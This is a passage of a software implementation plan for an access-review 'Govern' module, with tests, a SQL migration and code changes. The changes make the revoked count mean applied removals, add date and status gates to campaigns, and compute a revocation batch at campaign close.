---

### Task 3: "Revoked" means applied, and the states that gate nothing

Spec §6.1 — **G3** (the `revoked` figure counts items that were not revoked) and **G13** (unreachable states and dead gates: `executing`, `opensAt`, `extendCampaign`).

§10 defines the word: **"'Revoked' means the removal was applied at the system that holds it, confirmed by that system, and observed by a subsequent read."** `closeDueCampaigns` computes it as "items whose latest decision is `revoke`", which sweeps in `revocation_requires_change` — the one case §13 says is *never* counted in a revoked figure and calls "a lie with a signature on it" — plus `revocation_failed`, plus every item still sitting in `revoke_decided` with nothing dispatched at all.

**Resolution chosen:** carry the intermediate states as their own columns rather than collapsing them. A campaign that closes with 91 revoke decisions, 0 applied and 3 that cannot be executed has to be able to say all three numbers; folding them into one figure is exactly the report §13's vocabulary section exists to forbid. That needs a migration, and it is the only one in this plan.

`opensAt` and `extendCampaign` are the same defect in a different place: a value stored, displayed, and consulted by nothing.

**Files:**
- Create: `packages/db/prisma/migrations/20260831000000_campaign_revocation_vocabulary/migration.sql`
- Modify: `packages/db/prisma/schema.prisma:2747-2756` (the `Campaign` status comment and counts)
- Modify: `packages/core/src/govern/reviewer-service.ts:846-925` (the counts and the close write)
- Modify: `packages/core/src/govern/campaign-service.ts:415-425` (the `startCampaign` gate) and `:603-640` (`extendCampaign`)
- Modify: `apps/api/src/routes/govern-portal.ts:77` (the `executing` reader)
- Modify: `apps/api/src/routes/admin/govern.ts:665-680` (the campaign `counts` block)
- Test: `packages/core/src/govern/reviewer-service.test.ts`, `packages/core/src/govern/campaign-service.test.ts`

**Interfaces:**
- Consumes: `withTenant` from `@syntra/db`; `recordEvent`; `governSettings`; `upsertFindings` and `createRemediationItem` from `./finding-service.js`.
- Produces:
  - `Campaign.revokeDecidedItems: Int`, `Campaign.dispatchedItems: Int`, `Campaign.failedItems: Int` — new columns, default `0`.
  - `closeDueCampaigns(tenantId, options?) => Promise<{ closed: number; undecided: number }>` — unchanged signature; `revokedItems` now means `status = 'revocation_applied'`.
  - `startCampaign` gains a `CampaignRefusedError` code `'not_open_yet'`.
  - `extendCampaign` gains a `CampaignRefusedError` code `'not_open'`.
  - `CampaignRefusedError`'s code union becomes `'stale_source' | 'stale_snapshot' | 'empty_scope' | 'not_draft' | 'not_open_yet' | 'not_open'`.

- [ ] **Step 1: Write the failing tests for the vocabulary**

In `packages/core/src/govern/reviewer-service.test.ts`, **replace** the existing `it('NEVER counts a revocation_requires_change item as revoked, and counts dispatched ones as decided', ...)` (line 794) with:

```ts
  it('counts REVOKED as applied, and every other outcome on its own line', async () => {
    // §10 defines the word, and this is the whole of the definition:
    // "'Revoked' means the removal was APPLIED at the system that holds it,
    // confirmed by that system, and observed by a subsequent read."
    //
    // The old form counted "items whose latest decision is revoke", which swept
    // in `revocation_requires_change` -- the case §13 says is NEVER counted in a
    // revoked figure and calls "a lie with a signature on it" -- plus
    // `revocation_failed`, plus every item still in `revoke_decided` with
    // nothing dispatched at all. A campaign that removed nothing reported 91
    // revocations.
    const applied = await seedItem('Anna');
    const dispatched = await seedItem('Bram');
    const requiresChange = await seedItem('Anna');
    const failed = await seedItem('Bram');
    const stillDecided = await seedItem('Anna');

    await withTenant(tenantId, async (tx) => {
      for (const [itemId, status] of [
        [applied, 'revocation_applied'],
        [dispatched, 'revocation_dispatched'],
        [requiresChange, 'revocation_requires_change'],
        [failed, 'revocation_failed'],
        [stillDecided, 'revoke_decided'],
      ] as const) {
        await tx.campaignItem.update({ where: { id: itemId }, data: { status } });
        await tx.campaignDecision.create({
          data: {
            tenantId,
            itemId,
            personId: person['Jan']!,
            decision: 'revoke',
            comment: 'no longer needed',
            itemOpenedAt: NOW,
            decidedAt: NOW,
            sessionDecisionOrdinal: 1,
            coverageAtDecision: {},
          },
        });
      }
    });

    await closeDueCampaigns(tenantId, { now: new Date(DUE.getTime() + 60_000) });
    const campaign = await withTenant(tenantId, (tx) =>
      tx.campaign.findUniqueOrThrow({ where: { id: campaignId } }),
    );

    // All five carry a decision, so all five are DECIDED and coverage is 100.
    expect(campaign.coveragePercent).toBe(100);
    expect(campaign.status).toBe('closed_complete');

    // ONE was actually removed.
    expect(campaign.revokedItems).toBe(1);
    // And the other four are each visible, each on their own line, because a
    // number nobody can decompose is a number an auditor cannot check.
    expect(campaign.dispatchedItems).toBe(1);
    expect(campaign.requiresChangeItems).toBe(1);
    expect(campaign.failedItems).toBe(1);
    expect(campaign.revokeDecidedItems).toBe(1);
  });

  it('counts a CONFIRMED dispatch as dispatched, not as revoked', async () => {
    // §13's honest intermediate state: "the owning subsystem reported the
    // removal applied, and no snapshot has been built since". Two conditions,
    // not one, "because a write that reported success and did not land is a
    // case Provision's convergence logic exists for and Govern should not be
    // more credulous than Provision is".
    const itemId = await seedItem('Anna');
    await withTenant(tenantId, async (tx) => {
      await tx.campaignItem.update({
        where: { id: itemId },
        data: { status: 'revocation_confirmed' },
      });
      await tx.campaignDecision.create({
        data: {
          tenantId,
          itemId,
          personId: person['Jan']!,
          decision: 'revoke',
          comment: 'no longer needed',
          itemOpenedAt: NOW,
          decidedAt: NOW,
          sessionDecisionOrdinal: 1,
          coverageAtDecision: {},
        },
      });
    });

    await closeDueCampaigns(tenantId, { now: new Date(DUE.getTime() + 60_000) });
    const campaign = await withTenant(tenantId, (tx) =>
      tx.campaign.findUniqueOrThrow({ where: { id: campaignId } }),
    );
    expect(campaign.revokedItems).toBe(0);
    expect(campaign.dispatchedItems).toBe(1);
  });
```

- [ ] **Step 2: Write the failing tests for the dead gates**

Add to the end of `packages/core/src/govern/campaign-service.test.ts`:

```ts
/**
 * A value stored, shown on the screen, and consulted by nothing.
 *
 * `opensAt` is `REQUIRED` on the row and is the first half of the reminder
 * cadence -- `runCampaignReminders` computes `elapsed / total` from it -- so a
 * campaign scheduled to open next month was live the moment somebody pressed
 * start, and its reminder share was NEGATIVE until the opening date passed.
 * "Scheduled for next quarter" was a label, not a behaviour.
 */
describe('opensAt', () => {
  it('refuses to start a campaign before it opens', async () => {
    await buildSnapshot(tenantId, { now: NOW });
    const { id } = await createCampaign(
      tenantId,
      actorUserId,
      draft({ opensAt: new Date(NOW.getTime() + 7 * 86_400_000) }),
    );
    await expect(
      startCampaign(tenantId, actorUserId, id, { now: NOW }),
    ).rejects.toMatchObject({ code: 'not_open_yet' });

    const campaign = await withTenant(tenantId, (tx) =>
      tx.campaign.findUniqueOrThrow({ where: { id } }),
    );
    expect(campaign.status).toBe('draft');
  });

  it('starts it once the opening date has passed', async () => {
    await buildSnapshot(tenantId, { now: NOW });
    const { id } = await createCampaign(
      tenantId,
      actorUserId,
      draft({ opensAt: new Date(NOW.getTime() - 86_400_000) }),
    );
    const started = await startCampaign(tenantId, actorUserId, id, { now: NOW });
    expect(started.status).toBe('open');
  });
});

/**
 * "A due date that can be moved quietly is not a due date" -- and a due date
 * that can be moved after the campaign closed is not a due date either. The
 * function checked only that the new date was later, so a closed campaign's
 * `dueAt` could be pushed out, its `extensionCount` raised, and its reviewers
 * re-notified about a queue nobody can decide in. The evidence bundle then
 * carries a due date the campaign never actually ran to.
 */
describe('extendCampaign', () => {
  it('refuses to extend a campaign that has closed', async () => {
    await buildSnapshot(tenantId, { now: NOW });
    const { id } = await createCampaign(tenantId, actorUserId, draft());
    await withTenant(tenantId, (tx) =>
      tx.campaign.update({ where: { id }, data: { status: 'closed_incomplete' } }),
    );
    await expect(
      extendCampaign(tenantId, actorUserId, id, new Date(DUE.getTime() + 30 * 86_400_000)),
    ).rejects.toMatchObject({ code: 'not_open' });
  });
});
```

`draft(over)` (line 121), `NOW`, `DUE`, `actorUserId`, `buildSnapshot`, `createCampaign`, `startCampaign` and `extendCampaign` are all already in the file. Use them — do not introduce a second seeding path.

- [ ] **Step 3: Run both to verify they fail**

```bash
npx vitest run packages/core/src/govern/reviewer-service.test.ts -t 'REVOKED as applied'
npx vitest run packages/core/src/govern/campaign-service.test.ts -t 'opensAt'
```

Expected: FAIL — `revokedItems` is 5 and `dispatchedItems` does not exist on the model; `startCampaign` returns `{ status: 'open' }` for a campaign that has not opened.

- [ ] **Step 4: Add the three columns**

Create `packages/db/prisma/migrations/20260831000000_campaign_revocation_vocabulary/migration.sql`:

```sql
-- "Revoked" means APPLIED, and the other four outcomes each need a line.
--
-- §10 of the Govern design defines the word once: "'Revoked' means the removal
-- was applied at the system that holds it, confirmed by that system, and
-- observed by a subsequent read." `closeDueCampaigns` computed it as "items
-- whose latest decision is revoke", which swept in
-- `revocation_requires_change` -- the case §13 says is NEVER counted in a
-- revoked figure and calls "a lie with a signature on it" -- plus
-- `revocation_failed`, plus every item still sitting in `revoke_decided` with
-- nothing dispatched at all. A campaign that removed nothing reported 91
-- revocations, on the artifact somebody signs.
--
-- Three columns rather than one narrower figure, because a campaign that
-- closes with 91 decisions, 0 applied and 3 that Govern cannot execute has to
-- be able to say all three numbers. Folding them into one is precisely the
-- report §13's vocabulary section exists to forbid.
--
-- Default 0 on every existing row. Historical campaigns are not backfilled:
-- the statuses they were computed from are still on their items, and inventing
-- a number for a closed campaign nobody re-counted would be the same class of
-- claim this change exists to remove.
ALTER TABLE "Campaign"
  ADD COLUMN "revokeDecidedItems" INTEGER NOT NULL DEFAULT 0,
  ADD COLUMN "dispatchedItems"    INTEGER NOT NULL DEFAULT 0,
  ADD COLUMN "failedItems"        INTEGER NOT NULL DEFAULT 0;
```

In `packages/db/prisma/schema.prisma`, in `model Campaign`, replace the status comment and the counts block (lines 2747–2756) with:

```prisma
  /// draft | generating | open | closed_complete | closed_incomplete | cancelled
  ///
  /// There is no `executing`. It was in this list, was written by nothing, and
  /// `closeDueCampaigns` closes `open` alone -- so a campaign that reached it
  /// would never close and every item in it would stay decidable forever.
  status String @default("draft")

  totalItems          Int    @default(0)
  certifiedItems      Int    @default(0)
  /// APPLIED at the system that holds it, confirmed by that system, and
  /// observed by a subsequent read (§10). NOT "the latest decision was
  /// revoke": that counts requires_change, failed, and decisions nothing has
  /// dispatched yet, which is a campaign claiming work it did not do.
  revokedItems        Int    @default(0)
  /// Decided `revoke` and not yet computed into a batch.
  revokeDecidedItems  Int    @default(0)
  /// Sent to the owning subsystem, or reported applied by it and not yet
  /// observed gone. A dispatch is a request, not an outcome.
  dispatchedItems     Int    @default(0)
  /// A permanent failure reported by the owning subsystem. The holding stays
  /// in the inventory as held, because it is.
  failedItems         Int    @default(0)
  mootItems           Int    @default(0)
  undecidedItems      Int    @default(0)
  blockedItems        Int    @default(0)
  requiresChangeItems Int    @default(0)
  /// (decided + moot) / total. Never printed without the counts beside it.
  coveragePercent     Float?
```

- [ ] **Step 5: Apply the migration and regenerate the client**

```bash
pnpm db:migrate
pnpm db:generate
```

Expected: `1 migration found` applied, then `Generated Prisma Client`. If `db:migrate` reports drift, stop — the schema edit and the SQL must say the same thing.

- [ ] **Step 6: Count the outcomes from the statuses that define them**

In `packages/core/src/govern/reviewer-service.ts`, replace the whole `const counts = await withTenant(tenantId, async (tx) => { ... });` block (lines 856–890) with:

```ts
    const counts = await withTenant(tenantId, async (tx) => {
      const total = await tx.campaignItem.count({ where: { campaignId: campaign.id } });

      // ---- the OUTCOME counts, from the statuses that define them ----------
      //
      // §10 defines "revoked" once and this is the whole of it: the removal was
      // APPLIED at the system that holds it, confirmed by that system, and
      // observed by a subsequent read. `revocation_applied` is the status that
      // means exactly that, and it is the only one that may be counted here.
      //
      // The previous form counted "items whose latest decision is revoke",
      // which swept in `revocation_requires_change` -- the case §13 says is
      // NEVER counted in a revoked figure and calls "a lie with a signature on
      // it" -- plus `revocation_failed`, plus every item still in
      // `revoke_decided` with nothing dispatched at all. At close time NOTHING
      // has been dispatched yet, so the honest `revoked` figure on a campaign
      // that has just closed is normally ZERO, and that is the point: the
      // removals have been decided, not done.
      //
      // ONE grouped query, not seven counts. This runs per campaign inside the
      // close loop and seven round trips per campaign is seven times the work
      // for the same answer.
      const byStatus = await tx.campaignItem.groupBy({
        by: ['status'],
        where: { campaignId: campaign.id },
        _count: { _all: true },
      });
      const countOf = (status: string): number =>
        byStatus.find((row) => row.status === status)?._count._all ?? 0;

      const moot = countOf('moot');
      const requiresChange = countOf('revocation_requires_change');
      const revoked = countOf('revocation_applied');
      const revokeDecided = countOf('revoke_decided');
      // `dispatched` and `confirmed` together: §13 calls `confirmed` "an honest
      // intermediate state" -- the subsystem said it applied and no snapshot has
      // observed it gone -- and the one thing both share is that they are NOT
      // revoked. Reporting them apart would put a distinction on the campaign
      // report that only the next snapshot can resolve.
      const dispatched = countOf('revocation_dispatched') + countOf('revocation_confirmed');
      const failed = countOf('revocation_failed');

      // ---- `decided`, which is a different question -------------------------
      //
      // §12: `coveragePercent = (decided + moot) / total` where `decided` is
      // EVERY ITEM CARRYING A CampaignDecision. Deriving it from statuses
      // instead omits the outcome statuses, so a campaign that dispatched 91
      // revocations would report them as uncovered.
      const decidedGroups = await tx.campaignDecision.groupBy({
        by: ['itemId'],
        where: { item: { campaignId: campaign.id } },
        _max: { decidedAt: true },
      });
      const decided = decidedGroups.length;

      // `certified` stays decision-derived, and stays on the LATEST decision:
      // an item revoked and then re-certified on appeal is certified. Ordered
      // ascending and overwritten, because `CampaignDecision` is append-only
      // and `sessionDecisionOrdinal` is per session rather than per item.
      const history = await tx.campaignDecision.findMany({
        where: { item: { campaignId: campaign.id } },
        select: { itemId: true, decision: true },
        orderBy: { decidedAt: 'asc' },
      });
      const decisionByItem = new Map<string, string>();
      for (const row of history) decisionByItem.set(row.itemId, row.decision);
      let certified = 0;
      for (const decision of decisionByItem.values()) {
        if (decision === 'certify') certified += 1;
      }

      return {
        total,
        moot,
        requiresChange,
        decided,
        certified,
        revoked,
        revokeDecided,
        dispatched,
        failed,
      };
    });
```

Then, in the `tx.campaign.update` immediately below, add the three new columns beside `revokedItems`:

```ts
          certifiedItems: counts.certified,
          revokedItems: counts.revoked,
          revokeDecidedItems: counts.revokeDecided,
          dispatchedItems: counts.dispatched,
          failedItems: counts.failed,
          requiresChangeItems: counts.requiresChange,
```

and the same four in both the `recordEvent` payload and the `campaign_low_coverage` finding detail, so the audit row and the finding say the same five numbers the campaign row does:

```ts
          revoked: counts.revoked,
          revokeDecided: counts.revokeDecided,
          dispatched: counts.dispatched,
          failed: counts.failed,
          requiresChange: counts.requiresChange,
```

- [ ] **Step 7: Make `opensAt` gate something**

In `packages/core/src/govern/campaign-service.ts`, widen the error union at line 88:

```ts
export class CampaignRefusedError extends Error {
  constructor(
    readonly code:
      | 'stale_source'
      | 'stale_snapshot'
      | 'empty_scope'
      | 'not_draft'
      | 'not_open_yet'
      | 'not_open',
    /** Which clock. A refusal that does not say is a refusal nobody can act on. */
    readonly clock: 'source' | 'snapshot' | null,
    message: string,
  ) {
    super(message);
    this.name = 'CampaignRefusedError';
  }
}
```

and in `startCampaign`, immediately after the `if (campaign.status !== 'draft')` block, insert:

```ts
    // `opensAt` GATES SOMETHING NOW.
    //
    // It is REQUIRED on the row, it is shown on the screen, and it is the first
    // half of the reminder cadence -- `runCampaignReminders` computes
    // `elapsed / total` from it. Nothing consulted it here, so a campaign
    // scheduled to open next month went live the moment somebody pressed start,
    // 200 reviewers were emailed a queue they were not meant to see yet, and
    // the reminder share was NEGATIVE until the opening date passed, which
    // suppressed every reminder in the meantime. "Scheduled for next quarter"
    // was a label rather than a behaviour.
    if (campaign.opensAt.getTime() > now.getTime()) {
      throw new CampaignRefusedError(
        'not_open_yet',
        null,
        `this campaign opens on ${campaign.opensAt.toDateString()}; starting it now would email every reviewer a queue that is not due to exist yet`,
      );
    }
```

- [ ] **Step 8: Make `extendCampaign` refuse a campaign that is not running**

In `extendCampaign`, immediately after `const campaign = await tx.campaign.findUniqueOrThrow({ where: { id: campaignId } });`, insert:

```ts
    // "A due date that can be moved quietly is not a due date" -- and one that
    // can be moved after the campaign closed is not a due date either. This
    // checked only that the new date was later, so a closed campaign's `dueAt`
    // could be pushed out, its `extensionCount` raised, and every reviewer with
    // a still-`pending` item re-notified about a queue that can no longer be
    // decided in: `recordCampaignDecision` refuses anything but `open`. The
    // evidence bundle then carries a due date the campaign never ran to, which
    // is the one fact §11 says the original date exists to preserve.
    if (campaign.status !== 'open') {
      throw new CampaignRefusedError(
        'not_open',
        null,
        `this campaign is ${campaign.status}; a due date can only be moved while reviewers can still decide`,
      );
    }
```

- [ ] **Step 9: Remove the last reader of `executing`**

In `apps/api/src/routes/govern-portal.ts:77`, replace the campaign filter:

```ts
          campaign: {
            // `open`, and only `open`. `executing` was in this list and is
            // written by nothing in the tree; `closeDueCampaigns` closes `open`
            // alone, so a campaign that reached it would never close.
            status: 'open',
            ...(query.campaignId === undefined ? {} : { id: query.campaignId }),
          },
```

- [ ] **Step 10: Put the new counts on the campaign screen's contract**

In `apps/api/src/routes/admin/govern.ts`, in the `GET /govern/campaigns/:id` handler, extend the `counts` object:

```ts
        counts: {
          total: campaign.totalItems,
          certified: campaign.certifiedItems,
          // §10's definition, and the four states that are NOT it, each on
          // their own line. A campaign that closes with 91 revoke decisions, 0
          // applied and 3 Govern cannot execute has to be able to say all
          // three numbers; one combined figure is the report §13 forbids.
          revoked: campaign.revokedItems,
          revokeDecided: campaign.revokeDecidedItems,
          dispatched: campaign.dispatchedItems,
          failed: campaign.failedItems,
          requiresChange: campaign.requiresChangeItems,
          moot: campaign.mootItems,
          undecided: campaign.undecidedItems,
          blocked: campaign.blockedItems,
        },
```

- [ ] **Step 11: Run the tests to verify they pass**

```bash
npx vitest run packages/core/src/govern/reviewer-service.test.ts
npx vitest run packages/core/src/govern/campaign-service.test.ts
npx vitest run apps/api/src/routes/govern-portal.test.ts apps/api/src/routes/admin/govern.test.ts
```

Expected: PASS. If a campaign-service case fails on `not_open_yet`, its fixture set `opensAt` in the future — the existing suite mostly uses `opensAt: NOW`; fix the fixture rather than weakening the gate.

- [ ] **Step 12: Typecheck and commit**

Run: `npx tsc -b`
Expected: exit 0.

```bash
git add packages/db/prisma/migrations/20260831000000_campaign_revocation_vocabulary/migration.sql \
        packages/db/prisma/schema.prisma \
        packages/core/src/govern/reviewer-service.ts \
        packages/core/src/govern/reviewer-service.test.ts \
        packages/core/src/govern/campaign-service.ts \
        packages/core/src/govern/campaign-service.test.ts \
        apps/api/src/routes/govern-portal.ts \
        apps/api/src/routes/admin/govern.ts
git commit -m "$(cat <<'MSG'
fix(govern): revoked means applied, and three states that gated nothing

Section 10 defines the word once: revoked means the removal was applied at
the system that holds it, confirmed by that system, and observed by a
subsequent read. closeDueCampaigns computed "items whose latest decision
is revoke", which swept in revocation_requires_change -- the case section
13 says is NEVER counted in a revoked figure and calls a lie with a
signature on it -- plus revocation_failed, plus every item still in
revoke_decided with nothing dispatched at all. At close time nothing HAS
been dispatched, so a campaign that removed nothing reported 91
revocations on the artifact somebody signs.

Revoked is now revocation_applied, and the four other outcomes get their
own columns. Three columns rather than a narrower single figure, because a
campaign closing with 91 decisions, 0 applied and 3 that cannot be
executed has to be able to say all three numbers.

Three dead gates go with it. `executing` was written by nothing and
closeDueCampaigns closes only open, so anything reaching it would never
close -- both readers removed. `opensAt` gated nothing, so a campaign
scheduled for next month went live on start and its reminder share was
negative until the date passed, suppressing every reminder. And
extendCampaign checked only that the new date was later, so a closed
campaign's due date could be moved and its reviewers re-notified about a
queue nobody can decide in.
MSG
)"
```

---

### Task 4: A campaign close computes its revocation batch

Spec §6.1 — **G15**. §13: "`revoke_decided` items do not dispatch as they are decided. They accumulate, and **at campaign close** — or at an explicit **Execute revocations** action before it — they are computed into a `RevocationBatch`." `closeDueCampaigns` never calls `computeRevocationBatch` and no job does. The only caller is `POST /govern/campaigns/:id/revocations`, which nothing in the console invokes (W6). A campaign closes with its revoke decisions sitting untouched forever unless an administrator finds the route by hand.

**Resolution chosen (per the standing decision to build user-facing capability):** compute the batch **before** the close transaction, not after. `computeRevocationBatch` never auto-applies — it produces a `previewed` or `blocked` batch that a named human must confirm — so computing it unattended takes nothing away from anybody. Placing it before the status flip means a failure leaves the campaign `open` and the next nightly `govern.campaign.close` tick retries; placing it after would leave a closed campaign whose batch nothing will ever build, because the close job only selects `status: 'open'`.

**Files:**
- Modify: `packages/core/src/govern/reviewer-service.ts:1-27` (imports) and `:840-900` (inside the per-campaign loop of `closeDueCampaigns`, between the undecided sweep and the counts)
- Test: `packages/core/src/govern/reviewer-service.test.ts`
- Test: `packages/core/src/govern/transaction-budget.test.ts` (the existing close case)

**Interfaces:**
- Consumes: `computeRevocationBatch` from `./revocation-service.js` —
  `computeRevocationBatch(tenantId: string, actorUserId: string | null, campaignId: string, options?: { now?: Date }) => Promise<{ batchId: string; status: string; requiresConfirmation: boolean; blockedReason: string | null }>`.
  `createRemediationItem(tx, tenantId, { kind, ownerPersonId, dueAt, campaignItemId?, findingId?, description, deepLink }) => Promise<string | null>` from `./finding-service.js`, already imported.
- Produces: `closeDueCampaigns(tenantId, options?) => Promise<{ closed: number; undecided: number; batches: number }>` — **the return type gains `batches`**, the number of campaigns for which a batch was computed. `jobs.ts`'s `GOVERN_CLOSE_JOB` handler discards the value and needs no change; `reviewer-service.test.ts` asserts on it.
- **New import edge:** `reviewer-service.ts → revocation-service.ts`. `revocation-service.ts` imports nothing from `reviewer-service.ts`, so no cycle is closed; `boundaries.test.ts` constrains `snapshot-service.ts` and `readable.ts` only and is unaffected.

- [ ] **Step 1: Write the failing test**

Add inside the existing `describe('closing', ...)` block in `packages/core/src/govern/reviewer-service.test.ts`:

```ts
  /**
   * §13: revoke decisions "accumulate, and at campaign close -- or at an
   * explicit Execute revocations action before it -- they are computed into a
   * RevocationBatch".
   *
   * Nothing computed one. `computeRevocationBatch`'s only caller was an admin
   * route the console never invokes, so a campaign closed with its revoke
   * decisions sitting untouched forever and the reviewers' 91 revocations were
   * a set of rows nobody would ever act on. The campaign report said
   * `revoke_decided`; the target still held everything.
   */
  it('computes the revocation batch at close', async () => {
    const itemId = await seedItem('Anna');
    await withTenant(tenantId, async (tx) => {
      await tx.campaignItem.update({ where: { id: itemId }, data: { status: 'revoke_decided' } });
      await tx.campaignDecision.create({
        data: {
          tenantId,
          itemId,
          personId: person['Jan']!,
          decision: 'revoke',
          comment: 'no longer needed',
          itemOpenedAt: NOW,
          decidedAt: NOW,
          sessionDecisionOrdinal: 1,
          coverageAtDecision: {},
        },
      });
    });

    const result = await closeDueCampaigns(tenantId, { now: new Date(DUE.getTime() + 60_000) });
    expect(result.batches).toBe(1);

    const batch = await withTenant(tenantId, (tx) =>
      tx.revocationBatch.findFirstOrThrow({ where: { campaignId } }),
    );
    // NOTHING AUTO-APPLIES. §13: "`autoApply` does not exist for a batch."
    // The first batch in a tenant always requires confirmation regardless of
    // size, because every denominator is zero and no percentage can say
    // anything about it.
    expect(batch.status).toBe('previewed');
    expect(batch.requiresConfirmation).toBe(true);

    const dispatches = await withTenant(tenantId, (tx) =>
      tx.revocationDispatch.findMany({ where: { batchId: batch.id } }),
    );
    expect(dispatches).toHaveLength(1);
    expect(dispatches[0]!.status).toBe('proposed');

    // And the item has NOT moved. A computed batch is a proposal.
    const item = await withTenant(tenantId, (tx) =>
      tx.campaignItem.findUniqueOrThrow({ where: { id: itemId } }),
    );
    expect(item.status).toBe('revoke_decided');
  });

  it('computes NO batch for a campaign with nothing to revoke', async () => {
    // An empty `RevocationBatch` row per closed campaign is a confirmation
    // screen with nothing on it, on the dashboard, for every campaign that ever
    // ran clean.
    const itemId = await seedItem('Anna');
    await withTenant(tenantId, (tx) =>
      tx.campaignItem.update({ where: { id: itemId }, data: { status: 'certified' } }),
    );

    const result = await closeDueCampaigns(tenantId, { now: new Date(DUE.getTime() + 60_000) });
    expect(result.batches).toBe(0);
    expect(await withTenant(tenantId, (tx) => tx.revocationBatch.count())).toBe(0);
  });

  /**
   * The batch is computed BEFORE the campaign closes, so a failure leaves the
   * campaign `open` and the next nightly tick retries. `closeDueCampaigns`
   * selects `status: 'open'`, so a batch that failed AFTER the close would be a
   * batch nothing would ever build -- the same silent drop, one step later.
   */
  it('leaves the campaign open when the batch cannot be computed', async () => {
    const itemId = await seedItem('Anna');
    await withTenant(tenantId, async (tx) => {
      await tx.campaignItem.update({ where: { id: itemId }, data: { status: 'revoke_decided' } });
      // The campaign's snapshot is made unreadable, which is what
      // `computeRevocationBatch` refuses on first.
      await tx.accessSnapshot.update({ where: { id: snapshotId }, data: { status: 'failed' } });
    });

    await expect(
      closeDueCampaigns(tenantId, { now: new Date(DUE.getTime() + 60_000) }),
    ).rejects.toThrow();

    const campaign = await withTenant(tenantId, (tx) =>
      tx.campaign.findUniqueOrThrow({ where: { id: campaignId } }),
    );
    expect(campaign.status).toBe('open');
  });
```

- [ ] **Step 2: Run the test to verify it fails**

Run: `npx vitest run packages/core/src/govern/reviewer-service.test.ts -t 'revocation batch at close'`

Expected: FAIL — `result.batches` is `undefined` and `RevocationBatch` is empty.

- [ ] **Step 3: Import the computation**

In `packages/core/src/govern/reviewer-service.ts`, add to the imports, after the `finding-service.js` import:

```ts
// §13: revoke decisions "accumulate, and at campaign close -- or at an explicit
// Execute revocations action before it -- they are computed into a
// RevocationBatch". Nothing computed one, so a campaign closed with its
// decisions sitting untouched forever.
//
// The edge is one-way: `revocation-service.ts` imports nothing from this file,
// so nothing here closes a cycle.
import { computeRevocationBatch } from './revocation-service.js';
```

- [ ] **Step 4: Compute the batch before the close**

In `closeDueCampaigns`, add the counter beside `let closed = 0;`:

```ts
  let batches = 0;
```

Then, in the per-campaign loop, **between** the end of the undecided-sweep `for (;;)` loop and the `// ---- the counts` block, insert:

```ts
    // ---- the revocation batch, BEFORE the close ---------------------------
    //
    // §13: revoke decisions "accumulate, and at campaign close -- or at an
    // explicit Execute revocations action before it -- they are computed into a
    // RevocationBatch". Nothing computed one. `computeRevocationBatch`'s only
    // caller was an admin route the console never invokes, so a campaign closed
    // with 91 revoke decisions sitting as rows nobody would ever act on: the
    // report said `revoke_decided` and the target still held everything. That
    // is the silent-drop failure this platform keeps rediscovering, wearing the
    // clothes of a completed audit.
    //
    // COMPUTING IS NOT APPLYING. §13: "`autoApply` does not exist for a batch."
    // What this produces is `previewed` or `blocked` -- a proposal on a screen,
    // with per-row skip, that a named human must confirm. So doing it
    // unattended takes nothing away from anybody, which is the only reason an
    // unattended path may touch this at all.
    //
    // BEFORE the status flip, not after, and that ordering is the whole safety
    // property. `closeDueCampaigns` selects `status: 'open'`, so a batch that
    // failed after the close would be a batch nothing would ever build. Failing
    // here leaves the campaign open and the next nightly tick retries; the
    // compute is idempotent by construction, because it supersedes a stale
    // non-terminal batch at the head of itself.
    const toRevoke = await withTenant(tenantId, (tx) =>
      tx.campaignItem.count({ where: { campaignId: campaign.id, status: 'revoke_decided' } }),
    );
    if (toRevoke > 0) {
      // `actorUserId: null` -- a background job has no request and therefore no
      // actor, and naming one would put a person's id on a computation they did
      // not ask for. The audit event records the campaign and the verdict, and
      // the CONFIRMATION is where a named human enters the record.
      const batch = await computeRevocationBatch(tenantId, null, campaign.id, { now });
      batches += 1;

      // A batch the guard refused outright is not a screen somebody will
      // happen upon. §13's four blocking conditions are all "re-base and let
      // the reviewers look at what changed", which is work with a deadline, so
      // it goes in the remediation queue with the campaign's owner on it.
      if (batch.status === 'blocked') {
        await withTenant(tenantId, (tx) =>
          createRemediationItem(tx, tenantId, {
            kind: 'revocation_batch_blocked',
            ownerPersonId: campaign.ownerPersonId,
            dueAt: new Date(now.getTime() + 7 * 86_400_000),
            description:
              `The revocations decided in "${campaign.name}" cannot be executed: ` +
              `${batch.blockedReason ?? 'the guard refused the batch'}. ` +
              'Nothing was removed and nothing will be until this is resolved.',
            deepLink: `/admin/govern/campaigns/${campaign.id}`,
          }),
        );
      }
    }
```

- [ ] **Step 5: Return the count**

Change the final `return { closed, undecided: undecidedTotal };` to:

```ts
  return { closed, undecided: undecidedTotal, batches };
```

and the declared return type on the function signature to `Promise<{ closed: number; undecided: number; batches: number }>`.

- [ ] **Step 6: Run the test to verify it passes**

Run: `npx vitest run packages/core/src/govern/reviewer-service.test.ts`

Expected: PASS. Pre-existing cases that assert `toMatchObject({ closed: 1, undecided: 1 })` still pass — `toMatchObject` ignores the new key.

- [ ] **Step 7: Extend the budget case to cover the close's new work**

In `packages/core/src/govern/transaction-budget.test.ts`, replace the body of `it('closes a 2,000-item campaign with no transaction over the budget', ...)` so it closes a campaign whose items were all **revoked** rather than certified — which is the shape that now computes a 2,000-row batch inside the close:

```ts
  it('closes a 2,000-item campaign with no transaction over the budget', async () => {
    await seedOrdinaryCampaign();
    await startCampaign(tenantId, actorUserId, campaignId, { now: NOW });
    // REVOKE, not certify. The close now computes the revocation batch §13 says
    // it must, and that is one transaction for the whole batch by design -- so
    // certifying every item would measure a close that skips the heaviest thing
    // it does.
    await decideEveryItem('revoke');
    const { result, slowest } = await timedTransactions(() =>
      closeDueCampaigns(tenantId, { now: new Date(DUE.getTime() + 60_000) }),
    );
    expect(result.batches).toBe(1);
    expect(slowest).toBeLessThan(BUDGET_MS);
  }, 300_000);
```

- [ ] **Step 8: Run the budget file**

Run: `GOVERN_BUDGET_MS=4500 npx vitest run packages/core/src/govern/transaction-budget.test.ts -t 'closes a 2,000-item campaign'`

Expected: PASS. The budget is calibrated against hardware, not code — 4500 is what CI uses; run it once at the default 2500 as well and record the measurement in the commit message if it is close.

- [ ] **Step 9: Typecheck and commit**

Run: `npx tsc -b`
Expected: exit 0.

```bash
git add packages/core/src/govern/reviewer-service.ts \
        packages/core/src/govern/reviewer-service.test.ts \
        packages/core/src/govern/transaction-budget.test.ts
git commit -m "$(cat <<'MSG'
feat(govern): a campaign close computes its revocation batch

Section 13 says revoke decisions accumulate and are computed into a
RevocationBatch at campaign close, or at an explicit action before it.
Nothing computed one. computeRevocationBatch's only caller was an admin
route the console never invokes, so a campaign closed with 91 revoke
